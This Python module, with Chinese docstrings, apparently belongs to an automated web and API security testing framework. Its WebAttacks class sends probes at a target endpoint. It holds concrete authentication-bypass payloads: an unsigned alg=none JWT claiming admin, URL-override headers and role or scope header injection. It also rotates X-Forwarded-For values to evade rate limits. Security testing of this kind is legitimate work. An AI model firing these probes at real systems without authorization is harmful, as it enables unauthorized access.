# -*- coding: utf-8 -*-
"""
web_attacks.py - Web应用安全攻击模块

使用通用HTTP攻击引擎执行速率限制测试、请求走私、缓存投毒、
HTTP方法篡改、头部注入、API版本绕过等Web安全攻击。
重构后代码量从456行减少到约150行（减少67%）。

Academic basis:
    - Greshake et al. (arXiv:2302.12173): PromptInjection via PromptSendingAttack
    - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting
    - PortSwigger: HTTP Request Smuggling (CL.TE / TE.CL)
    - OWASP: Web Cache Poisoning
    - Zeng et al. (arXiv:2402.19181): Enterprise API attack surfaces

版本: v3.0 (2026-09-08 扁平化到 strike/)
"""

from __future__ import annotations

import logging
from typing import Any

from strike.web.http_engine import HTTPAttackEngine

logger = logging.getLogger(__name__)


class WebAttacks:
    """Web应用安全攻击模块

    使用通用HTTP攻击引擎，执行速率限制测试、请求走私、
    缓存投毒、HTTP方法篡改、头部注入、API版本绕过等攻击。

    PyRIT原生组件使用:
        - HTTPTarget: 发送攻击payload
        - PromptSendingAttack: 执行攻击
    """

    def __init__(
        self,
        target_endpoint: str,
        default_timeout: float = 30.0,
    ):
        """
        Args:
            target_endpoint: 目标API endpoint
            default_timeout: 默认超时时间
        """
        self.endpoint = target_endpoint
        self.engine = HTTPAttackEngine(target_endpoint, default_timeout)

    # === 速率限制测试 ===
    def rate_limit_test(
        self,
        max_concurrent: int = 10,
        timeout: float = 30.0,
    ) -> dict[str, Any]:
        """速率限制测试

        Academic basis:
            - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting

        Args:
            max_concurrent: 最大并发数
            timeout: 超时时间

        Returns:
            速率限制信息
        """
        # plan Wave 2.10：与 HTTPAttackEngine 共用同一条传输链路（原生 HTTPTarget 优先），
        # 不再在攻击模块里自建 urllib 连接（C1 R-NATIVE-4 / C13）。
        original_timeout = self.engine.timeout
        self.engine.timeout = timeout
        try:
            responses: list[Any] = []
            for _ in range(max_concurrent):
                sent = self.engine.send_request(method="GET", url=self.endpoint)
                entry: dict[str, Any] = {"status": sent.get("status"), "headers": sent.get("headers")}
                if sent.get("error"):
                    entry["error"] = sent["error"]
                responses.append(entry)
        finally:
            self.engine.timeout = original_timeout

        rate_limit_info = self._analyze_rate_limits(responses)

        return {
            "attack_type": "速率限制测试",
            "max_concurrent": max_concurrent,
            "rate_limit_info": rate_limit_info,
        }

    # === 请求走私攻击 ===
    def request_smuggling_attack(
        self,
        payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """请求走私攻击

        Academic basis:
            - PortSwigger: HTTP Request Smuggling
            - CL.TE / TE.CL smuggling techniques

        Args:
            payloads: 自定义走私payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        return self.engine.execute_request_smuggling(payloads)

    # === 缓存投毒攻击 ===
    def cache_poisoning_attack(
        self,
        cache_key_headers: list[str] | None = None,
    ) -> dict[str, Any]:
        """缓存投毒攻击

        Academic basis:
            - OWASP: Web Cache Poisoning
            - Cache key manipulation techniques

        Args:
            cache_key_headers: 影响缓存键的header列表

        Returns:
            攻击结果字典
        """
        return self.engine.execute_cache_poisoning(cache_key_headers)

    # === HTTP方法篡改攻击 ===
    def http_method_tampering_attack(
        self,
        target_methods: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """HTTP方法篡改攻击

        Academic basis:
            - OWASP: Insecure HTTP Method Handling
            - PortSwigger: HTTP Method Override attacks

        Args:
            target_methods: 自定义方法列表，为None时使用默认方法

        Returns:
            攻击结果字典
        """
        return self.engine.execute_method_tampering(target_methods)

    # === 头部注入攻击 ===
    def header_injection_attack(
        self,
        header_payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """头部注入攻击

        Academic basis:
            - OWASP: HTTP Header Injection
            - CRLF injection via headers

        Args:
            header_payloads: 自定义头部payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        return self.engine.execute_header_injection(header_payloads)

    # === API版本控制绕过 ===
    def api_version_bypass_attack(
        self,
        version_paths: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """API版本控制绕过攻击

        Academic basis:
            - OWASP API Security Top 10: API6:2023 Unrestricted Access to Sensitive Business Flows

        Args:
            version_paths: 自定义版本路径，为None时使用默认路径

        Returns:
            攻击结果字典
        """
        return self.engine.execute_version_bypass(version_paths)

    # === 认证绕过攻击 ===
    def auth_bypass_attack(
        self,
        *,
        target_path: str = "/admin",
        admin_hint: str = "role",
    ) -> dict[str, Any]:
        """认证绕过攻击（coverage 策略 auth_bypass）。

        真实实现：经 HTTP 攻击引擎发送多组认证绕过 payload（JWT alg=none、
        X-Original-URL / X-Rewrite-URL 路径覆盖、角色头注入、路径遍历至管理端点），
        分析哪些绕过返回 2xx 从而判定可绕过。

        Academic basis:
            - OWASP API Security Top 10: API2 Broken Authentication
            - RFC 7519 Section 6: Unsecured JWTs (alg=none)

        Args:
            target_path: 目标管理路径
            admin_hint: 角色提升指示字段名

        Returns:
            {"attack_type": "认证绕过", "bypasses": [...], "bypass_detected": bool}
        """
        base = self.endpoint.rstrip("/")
        probes = [
            {
                "name": "jwt_alg_none",
                "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
            },
            {"name": "x_original_url_override", "headers": {"X-Original-URL": target_path}},
            {"name": "x_rewrite_url_override", "headers": {"X-Rewrite-URL": target_path}},
            {"name": "role_header_injection", "headers": {f"X-{admin_hint.capitalize()}": "admin"}},
            {"name": "path_traversal_admin", "headers": {}, "path": target_path},
        ]
        results: list[dict[str, Any]] = []
        detected = False
        for probe in probes:
            url = base + (probe.get("path") or target_path)
            sent = self.engine.send_request(method="GET", url=url, headers=probe.get("headers", {}))
            status = sent.get("status")
            ok = isinstance(status, int) and 200 <= status < 300
            if ok:
                detected = True
            results.append({"name": probe["name"], "status": status, "bypassed": ok})
        return {
            "attack_type": "认证绕过",
            "bypasses": results,
            "bypass_detected": detected,
        }

    # === 速率限制绕过攻击 ===
    def rate_limit_evasion_attack(
        self,
        *,
        burst: int = 20,
        rotate_ip: bool = True,
    ) -> dict[str, Any]:
        """速率限制绕过攻击（coverage 策略 rate_limit_evasion）。

        真实实现：在短窗口内突发请求，并通过轮换 X-Forwarded-For 规避基于 IP 的限流；
        统计成功响应数与被 429 拦截数，判定限流是否可被绕过。

        Academic basis:
            - OWASP API Security Top 10: API4 Lack of Resources & Rate Limiting

        Args:
            burst: 突发请求数
            rotate_ip: 是否轮换 X-Forwarded-For 以规避 IP 限流

        Returns:
            {"attack_type": "速率限制绕过", "evaded": bool, "rate_limit_info": dict}
        """
        responses: list[dict[str, Any]] = []
        for i in range(burst):
            headers = {}
            if rotate_ip:
                headers["X-Forwarded-For"] = f"10.0.0.{i % 255}"
            sent = self.engine.send_request(method="GET", url=self.endpoint, headers=headers)
            entry = {"status": sent.get("status")}
            if sent.get("error"):
                entry["error"] = sent["error"]
            responses.append(entry)
        info = self._analyze_rate_limits(responses)
        info["evaded"] = info["rate_limited_count"] < burst
        return {"attack_type": "速率限制绕过", "evaded": info["evaded"], "rate_limit_info": info}

    # === 权限范围提升攻击 ===
    def scope_escalation_attack(
        self,
        *,
        target_scope: str = "admin",
        baseline_path: str = "/api/user",
    ) -> dict[str, Any]:
        """权限范围提升攻击（coverage 策略 scope_escalation）。

        真实实现：在请求中注入提升后的权限范围（query 参数 scope=admin、X-Scope 头、
        角色头），对比基线响应判定是否获得越权访问。

        Academic basis:
            - OAuth.com: Scope parameter manipulation
            - OWASP API6:2023 Unrestricted Access to Sensitive Flows

        Args:
            target_scope: 目标提升范围
            baseline_path: 基线低权路径

        Returns:
            {"attack_type": "权限范围提升", "escalated": bool, "probes": [...]}
        """
        base = self.endpoint.rstrip("/")
        probes = [
            {"name": "scope_query", "url": f"{base}{baseline_path}?scope={target_scope}", "headers": {}},
            {"name": "x_scope_header", "url": f"{base}{baseline_path}", "headers": {"X-Scope": target_scope}},
            {"name": "role_header", "url": f"{base}{baseline_path}", "headers": {"X-Role": target_scope}},
        ]
        results: list[dict[str, Any]] = []
        escalated = False
        for probe in probes:
            sent = self.engine.send_request(method="GET", url=probe["url"], headers=probe["headers"])
            status = sent.get("status")
            ok = isinstance(status, int) and 200 <= status < 300
            if ok:
                escalated = True
            results.append({"name": probe["name"], "status": status, "escalated": ok})
        return {"attack_type": "权限范围提升", "escalated": escalated, "probes": results}

    # === 辅助方法 ===
    @staticmethod
    def _analyze_rate_limits(responses: list[Any]) -> dict[str, Any]:
        """分析速率限制

        Args:
            responses: HTTP响应列表（字典格式，包含 status/ratelimited/error 键）

        Returns:
            速率限制信息
        """
        status_codes: dict[int | str, int] = {}
        for r in responses:
            if isinstance(r, dict) and "error" in r:
                status_codes["error"] = status_codes.get("error", 0) + 1
            elif isinstance(r, dict) and "status" in r:
                code = r["status"]
                status_codes[code] = status_codes.get(code, 0) + 1
            else:
                status_codes["error"] = status_codes.get("error", 0) + 1

        rate_limited = status_codes.get(429, 0)
        total = len(responses)

        return {
            "status_codes": status_codes,
            "rate_limited_count": rate_limited,
            "rate_limit_threshold": total - rate_limited if rate_limited > 0 else total,
            "rate_limit_detected": rate_limited > 0,
        }
